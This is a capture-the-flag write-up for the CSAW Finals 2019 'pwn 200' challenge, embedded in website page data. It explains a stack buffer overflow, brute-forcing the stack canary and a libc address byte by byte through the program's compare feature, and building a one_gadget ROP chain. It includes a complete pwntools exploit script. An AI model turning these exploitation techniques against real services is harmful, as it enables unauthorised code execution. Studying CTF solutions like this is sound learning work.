{"componentChunkName":"component---src-templates-writeup-js","path":"/writeups/csaw-finals-2019/pwn/pwn200/sudhackar","result":{"pageContext":{"html":"<p><a href=\"ctf=csaw-finals-2019\"></a>\n<a href=\"type=reverse\"></a>\n<a href=\"tags=ida,brtueforce\"></a>\n<a href=\"tools=ida\"></a></p>\n<h1>pwn 200</h1>\n<p>Description</p>\n<pre><code>Hello, fresh recruit.\n\nnc pwn.chal.csaw.io 1003\n</code></pre>\n<p>Binary is small, x64, c++ compiled with very little features.</p>\n<p>It lets you input a buffer which can be copied to a stack buffer or compared to\nit.</p>\n<p>The write is not limited to size, so its very easy to overflow the stack buffer.\nBut canaries are present on the stack. We can use the compare feature to brute\nforce canary byte by byte.</p>\n<p>Binary has PIE enabled too, we can leak base or libc addresses too from the\nstack using the same technique. This will help us craft a ROP with one_gadget\nto achieve RCE.</p>\n<pre><code class=\"language-python\"># -*- coding: UTF-8 -*-\nfrom pwn import *\ncontext.arch = \"amd64\"\n# context.binary = \"/tmp/csaw/a.out\"\n# context.log_level = \"debug\"\np = process(\n    \"/tmp/host/csaw/a.out\",\n    env={\n        \"LD_PRELOAD\": \"/tmp/host/csaw/libc-2.27.so\"})\nraw_input()\n# p = remote(\"pwn.chal.csaw.io\", 1003)\n# g = gdb.attach(p, \"canary\\n context\\n vmmap\\n continue\")\n\n\ndef copy(s):\n    p.sendline(str(2))\n    p.sendline(str(len(s)))\n    p.sendline(s)\n\n\ndef check(s):\n    p.sendline(str(1))\n    p.sendline(str(len(s)))\n    p.sendline(s)\n    return \"found\" in p.recvline()\n\n\nbf = \"A\" * 9\ncopy(bf)\n\"\"\"\n00:0000│ rsp  0x7fffffffde90 ◂— 0x2\n01:0008│      0x7fffffffde98 ◂— 0x55555bcd\n02:0010│      0x7fffffffdea0 ◂— 0xbebafecaefbeadde\n03:0018│      0x7fffffffdea8 ◂— 0xbd6d636b76b2a700\n04:0020│ rbp  0x7fffffffdeb0 —▸ 0x7fffffffded0 —▸ 0x555555555b80 (__libc_csu_init) ◂— endbr64\n05:0028│      0x7fffffffdeb8 —▸ 0x555555555053 (main+60) ◂— mov    eax, 0\n06:0030│      0x7fffffffdec0 ◂— '\\n\\n\\n\\n\\n\\n\\n\\n'\n07:0038│      0x7fffffffdec8 ◂— 0xbd6d636b76b2a700\n\"\"\"\n\n# leak canary\nsp = set(['\\t', ' ', '\\n', '\\x0b', '\\x0c', '\\r'])\nfor j in xrange(7):\n    for i in xrange(1, 256):\n        if chr(i) not in sp:\n            if(check(bf + chr(i))):\n                bf += chr(i)\n                break\n\ncanary = unpack(\"\\x00\" + bf[9:])\nsuccess(hex(canary))\n\nbf = \"A\" * 56\ncopy(bf)\nfor j in xrange(6):\n    for i in xrange(256):\n        if chr(i) not in sp:\n            if(check(bf + chr(i))):\n                bf += chr(i)\n                break\n\n\nlibc = unpack(bf[56:] + \"\\x00\\x00\")\nsuccess(hex(libc))\n\npay = flat(0xdeadbeefdeadbeef,\n           canary,\n           0xdeadbeefdeadbeef,\n           0x10a38c + (libc - 0x21b97),\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0,\n           0)\ncontext.log_level = \"debug\"\ncopy(pay)\n\np.interactive()\n</code></pre>","relativePath":"writeups/csaw-finals-2019/pwn/pwn200/sudhackar"}}}